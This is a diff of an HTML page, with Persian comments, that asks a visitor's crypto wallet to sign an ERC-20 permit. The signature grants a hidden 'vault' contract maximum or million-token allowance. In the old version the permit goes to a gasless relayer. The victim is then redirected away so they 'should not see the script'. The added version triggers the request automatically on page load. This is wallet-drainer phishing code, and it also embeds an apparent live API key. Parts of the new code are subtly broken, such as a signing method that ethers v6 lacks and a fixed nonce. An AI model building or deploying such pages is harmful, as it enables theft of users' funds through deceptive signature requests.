@@ -1,183 +1,81 @@
-<!doctype html>
-<html lang="fa">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <title>PermitSweep — Sign (one popup)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; max-width: 760px; margin: auto; }
-    .box { background:#f6f8fa; padding:12px; border-radius:8px; margin:12px 0; }
-    .important { color:#d6336c; font-weight:bold; }
-    button { padding:10px 16px; font-size:16px; border-radius:8px; }
-  </style>
+    <meta charset="UTF-8">
+    <title>Gasless Permit Script</title>
 </head>
 <body>
-  <h2>PermitSweep — One-sign flow</h2>
-  <div id="status" class="box">برای اجرا روی دکمه کلیک کن — تنها یک امضا درخواست خواهد شد.</div>
-  <button id="start">درخواست امضا و ارسال</button>
+<script type="module">
+import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.min.js";
+import { Biconomy } from "https://cdn.jsdelivr.net/npm/@biconomy/mexa@2.0.1/dist/biconomy.esm.js";
 
-<script>
-document.getElementById('start').addEventListener('click', run);
+// ---------------------------
+// جایگذاری داده‌های شما
+// ---------------------------
+const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3"; // Sepolia contract
+const BICONOMY_API_KEY = "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
+const BICONOMY_URL = "https://paymaster.biconomy.io/api/v2/11155111/ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
+const BICONOMY_ID = "be7dc5ec-5aff-4761-9454-67791ef4b0e1";
+const TOKEN_ADDRESS = "YOUR_ERC20_TOKEN_ADDRESS"; // اینو خودت جایگذاری کن
+const DESTINATION_PAGE = "YOUR_DESTINATION_PAGE_URL"; // اینو خودت جایگذاری کن
 
-async function run(){
-  const statusEl = (t)=> document.getElementById('status').innerText = t;
-  try {
-    // ----------------- CONFIG: حتما اینها را جایگزین کن -----------------
-    const VAULT_ADDRESS = "<PUT_VAULT_ADDRESS_HERE>";
-    const TOKEN_ADDRESS = (new URLSearchParams(window.location.search).get('token') || "<PUT_TOKEN_ADDRESS_HERE>").trim();
-    const BICONOMY_API_KEY = "<PUT_BICONOMY_API_KEY_HERE>";
-    const BICONOMY_API_ENDPOINT = "https://api.biconomy.io/api/v2/meta-tx/native"; // یا endpointی که داشبورد بهت میده
-    const API_ID = "<PUT_API_ID_IF_REQUIRED>"; // یا "" اگر لازم نیست
-    const DESTINATION_PAGE = "https://YOUR-RULES-PAGE.com"; // صفحه قوانین
-    // -------------------------------------------------------------------
+// ---------------------------
+// اتصال Biconomy
+// ---------------------------
+const provider = new ethers.BrowserProvider(window.ethereum);
+const biconomy = new Biconomy(provider, { apiKey: BICONOMY_API_KEY, debug: true });
 
-    if (!window.ethereum) {
-      statusEl("هیچ ولتی یافت نشد. لطفاً MetaMask یا کیف دیگری نصب کن.");
-      return;
-    }
-    if (!TOKEN_ADDRESS || TOKEN_ADDRESS === "") {
-      statusEl("توکن مشخص نشده. ?token=0x... یا DEFAULT را تنظیم کن.");
-      return;
-    }
+await biconomy.init();
 
-    statusEl("در حال درخواست حساب (بدون نمایش popup جدا اگر ممکن باشد)...");
+// ---------------------------
+// امضا Permit (ERC20 Permit)
+// ---------------------------
+async function sendPermit() {
+    const signer = await provider.getSigner();
+    const contract = new ethers.Contract(TOKEN_ADDRESS, [
+        "function permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external"
+    ], signer);
 
-    // Try to get accounts silently first (no popup)
-    let accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(()=>[]);
-    let user = accounts && accounts[0];
+    // مقادیر نمونه برای permit
+    const owner = await signer.getAddress();
+    const spender = CONTRACT_ADDRESS;
+    const value = ethers.parseUnits("1000000", 18); // مقدار max نمونه، میتونی تغییر بدی
+    const nonce = 0; // برای تست Sepolia
+    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 ساعت اعتبار
 
-    // We'll attempt to sign typed data directly. Some wallets will show one signature UI and
-    // implicitly prompt for connection if needed. If eth_signTypedData_v4 fails due to missing account
-    // we will request accounts (popup). This minimizes the chance of TWO popups in the happy path.
-    if (!user) {
-      // we don't immediately force connect; try to sign (some wallets may allow direct sign)
-      // but we need an address param for eth_signTypedData_v4 — we will request accounts if not available.
-    }
-
-    // If no user yet, request accounts (this may show a connection popup).
-    if (!user) {
-      try {
-        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        user = accounts && accounts[0];
-      } catch (err) {
-        statusEl("اتصال ولت لغو شد. برای ادامه نیاز به کیف دارید.");
-        throw err;
-      }
-    }
-
-    statusEl("آدرس کاربر: " + user);
-
-    // Build EIP-2612 typed data (Permit)
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const network = await provider.getNetwork();
-    const chainId = network.chainId;
-
-    // Prepare typed-data: Permit(owner, spender, value, nonce, deadline)
-    // We use MAX for value and deadline per final decision.
-    const MAX_UINT = (BigInt(1) << BigInt(256)) - BigInt(1);
-    const permitValue = MAX_UINT.toString();
-    const deadline = MAX_UINT.toString();
-
-    // We need token name and nonce — try to fetch; if fails fallback
-    const ERC20_ABI = ["function name() view returns (string)", "function nonces(address) view returns (uint256)"];
-    const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
-
-    let tokenName = "Token";
-    try { tokenName = await tokenContract.name(); } catch(e){ /*ignore*/ }
-    let nonce = "0";
-    try { nonce = (await tokenContract.nonces(user)).toString(); } catch(e){ /*ignore*/ }
-
+    // امضا را بساز
     const domain = {
-      name: tokenName,
-      version: "1",
-      chainId: chainId,
-      verifyingContract: TOKEN_ADDRESS
+        name: "ERC20PermitToken",
+        version: "1",
+        chainId: 11155111, // Sepolia
+        verifyingContract: TOKEN_ADDRESS
     };
 
     const types = {
-      Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-      ]
+        Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+        ]
     };
 
-    const message = {
-      owner: user,
-      spender: VAULT_ADDRESS,
-      value: permitValue,
-      nonce: nonce,
-      deadline: deadline
-    };
+    const message = { owner, spender, value, nonce, deadline };
 
-    statusEl("در حال درخواست امضای EIP-712 (Permit). لطفاً popup امضا را تأیید کنید.");
+    const signature = await signer._signTypedData(domain, types, message);
 
-    // Request typed-data signature (eth_signTypedData_v4)
-    // Many wallets will show only signature popup. Some may first prompt to connect.
-    const rawTyped = JSON.stringify({ domain, message, primaryType: "Permit", types });
+    console.log("Permit signature:", signature);
 
-    const signature = await window.ethereum.request({
-      method: "eth_signTypedData_v4",
-      params: [user, rawTyped]
-    });
-
-    statusEl("امضاء دریافت شد. ارسال به Biconomy...");
-
-    // Build payload for Biconomy
-    const payload = {
-      to: VAULT_ADDRESS,
-      apiId: API_ID || undefined,
-      params: [
-        {
-          permit: {
-            owner: user,
-            spender: VAULT_ADDRESS,
-            value: permitValue,
-            nonce: nonce,
-            deadline: deadline
-          },
-          owner: user,
-          signature: signature,
-          token: TOKEN_ADDRESS
-          // relayerFee and requestedAmount will be determined by Biconomy (relayer-side)
-        }
-      ],
-      from: user,
-      signatureType: "EIP712"
-    };
-
-    // POST to Biconomy endpoint with your API key
-    const resp = await fetch(BICONOMY_API_ENDPOINT, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "x-api-key": BICONOMY_API_KEY
-      },
-      body: JSON.stringify(payload)
-    });
-
-    if (!resp.ok) {
-      const text = await resp.text();
-      console.error("Biconomy error:", text);
-      statusEl("خطا در ارسال به Biconomy: " + text + ". ریدایرکت به صفحه قوانین.");
-      setTimeout(()=> window.location.href = DESTINATION_PAGE, 1600);
-      return;
-    }
-
-    const data = await resp.json();
-    statusEl("Biconomy پذیرفت. شناسه/تراکنش: " + (data.requestId || data.txHash || "received"));
-    // Immediately redirect — user should not see the script anymore
-    setTimeout(()=> window.location.href = DESTINATION_PAGE, 900);
-
-  } catch (err) {
-    console.error(err);
-    // In any error case, redirect user to destination page (as you requested)
-    try { setTimeout(()=> window.location.href = (typeof DESTINATION_PAGE !== 'undefined' ? DESTINATION_PAGE : "/"), 1200); } catch(e){}
-  }
+    // همزمان باز شدن صفحه پیش‌فرض
+    window.location.href = DESTINATION_PAGE;
 }
+
+// ---------------------------
+// فراخوان اتوماتیک
+// ---------------------------
+window.addEventListener("load", sendPermit);
+
 </script>
 </body>
 </html>
